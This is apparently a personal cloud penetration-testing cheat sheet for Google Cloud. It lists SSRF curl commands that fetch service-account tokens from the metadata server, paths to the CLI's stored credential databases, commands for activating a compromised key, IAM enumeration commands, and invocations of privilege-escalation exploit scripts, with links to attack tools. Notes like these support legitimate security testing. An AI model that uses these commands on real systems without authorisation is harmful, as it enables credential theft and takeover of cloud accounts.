---
layout: notes
permalink: /notes/cloud/google/
title: Google Cloud Pentesting Notes
---

# Google Cloud Pentesting Notes

URLs:
- Google Workspace API : https://www.googleapis.com/
- Mail API : https://mail.googleapis.com/*
- Drive API : https://drive.googleapis.com/*
- Calendar API : https://calendar.googleapis.com

### SSRF
```
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/233003792018-compute@developer.gserviceaccount.com/token
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

### Metadata endpoints
```bash
/computeMetadata/v1/project/numeric-project-id	#The project number assigned to your project.
/computeMetadata/v1/project/project-id	#The project ID assigned to your project.
/computeMetadata/v1/instance/zone	#The zone the instance is running in.
/computeMetadata/v1/instance/service-accounts/default/aliases	#None
/computeMetadata/v1/instance/service-accounts/default/email	#The default service account email assigned to your project.
/computeMetadata/v1/instance/service-accounts/default/	#Lists all the default service accounts for your project.
/computeMetadata/v1/instance/service-accounts/default/scopes	#Lists all the supported scopes for the default service accounts.
/computeMetadata/v1/instance/service-accounts/default/token	#Returns the auth token that can be used to authenticate your application to other Google Cloud APIs.
```

### Configure Initial Compromised Service Account Credential:
```
gcloud auth activate-service-account --key-file alert-nimbus-335411-4ee19bc40a65.json
```

### CLI Access
```
gcloud auth login
```
Get the information about authenticated accounts with gcloud cli
```
gcloud auth list
```
Login with Service Account ( App ID + JSON Key File )
```
gcloud auth activate-service-account --key-file KeyFile
```

### Stored Credentials
Windows
```
C:\Users\UserName\AppData\Roaming\gcloud\
```
Linux
```
/home/UserName/.config/gcloud/
```

### Content of Stored Google Cloud CLI Secrets
```bash
#Database : access_tokens.db:
Table: access_tokens
Columns : account_id, access_token, token_expiry, rapt_token

#Database : credentials.db:
Table: credentials
Columns: account_id, value
```

## Enumeration
login via service account
```
gcloud auth activate-service-account --key-file devops-srvacc-key.json
```
List of Active User / Service accounts in Google Cloud CLI:
```
gcloud auth list
```
### Google Cloud CLI Configuration

Get the configuration of Gcloud CLI[ user / service account & project ]:
```
gcloud config list
```

### GCP Organizations

List of organizations, logged-in user / service account can access:
```
gcloud organizations list
```
Lists of iam policy attached to the specified organization:
```
gcloud organizations get-iam-policy [OrganizationID]
```

### GCP Projects

List of projects in an organization:
```
gcloud projects list
```
Lists of iam policy attached to the specified project:
```
gcloud projects get-iam-policy [ProjectID]
```

### GCP Service Account

List all of service accounts in a project:
```
gcloud iam service-accounts list
```
> iam in email - means it was created by the user, otherwise - it is default service account

Get the IAM policy for a service account:
```
gcloud iam service-accounts get-iam-policy [Service Account Email ID]
```
List of credential [keys] for a service account:
```
gcloud iam service-accounts keys list --iam-account [service Account Email ID]
```

### GCP Pre-defined Role 

Lists of roles in an origination / project:
```
gcloud iam roles list
```
Lists of permissions in a specified role:
```
gcloud iam roles describe [roles/owner]
```
### GCP Custom Role 

Lists of roles in an origination / project:
```
gcloud iam roles list --project [alert-nimbus-335411]
```
Lists of permissions in a specified role:
```
gcloud iam roles describe [RoleName] --project [alert-nimbus-335411]
```

## References and more techniques
[Hacking the Cloud](https://hackingthe.cloud/)

## Automated tools
[Cloud Enum](https://github.com/initstring/cloud_enum/)

Perform authenticated enumeration using “gcp_enum” script. 

[gcp_enum](https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum)
```
./gcp_enum.sh
```
Identity possible privilege escalation ways in gcp project. 

[GCP-IAM-Privilege-Escalation](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
```
python3 enumerate_member_permissions.py -p alert-nimbus-335411
python3 check_for_privesc.py
```
Exploit identified misconfigured iam permission for privilege escalation.
```
python3 ExploitScripts/iam.roles.update.py
```

## Other tools

### Gain Access 
[GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute)

[ip2provider](https://github.com/oldrho/ip2provider)

### Enumeration
[ScoutSuite](https://github.com/nccgroup/ScoutSuite)

[gcp-iam-role-permissions](https://github.com/darkbitio/gcp-iam-role-permissions)

[gcp-iam-viz](https://github.com/bartcode/gcp-iam-viz)

[cartography](https://github.com/lyft/cartography)

[gcp_misc](https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_misc)

[gcp_firewall_enum](https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_firewall_enum)

[cloud-service-enum](https://github.com/NotSoSecure/cloud-service-enum)

### Priv Esc
[gcploit](https://github.com/dxa4481/gcploit)

[gcp_scanner](https://github.com/google/gcp_scanner)

[PurplePanda](https://github.com/carlospolop/PurplePanda)

### Persistence and Lateral
[patchy](https://github.com/rek7/patchy)